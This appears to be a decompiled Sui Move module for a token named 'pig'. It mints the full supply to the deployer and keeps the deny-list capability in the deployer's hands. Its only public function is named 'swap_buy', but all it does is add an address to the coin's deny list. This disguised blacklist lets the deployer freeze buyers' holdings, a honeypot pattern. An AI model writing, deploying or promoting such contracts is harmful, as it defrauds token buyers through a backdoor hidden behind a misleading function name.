module 0x3c364268d3d450fac907dba71397605dd27a90edee9db033b7e3a582d958f464::pig {
    struct PIG has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PIG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PIG>(arg0, 9, b"pig", b"pig by Steve", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYEYTtag1snUvNJkKM8a2mPowDU9Ry29BsmMPTGvc7f9w"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PIG>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PIG>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PIG>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PIG>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PIG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PIG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

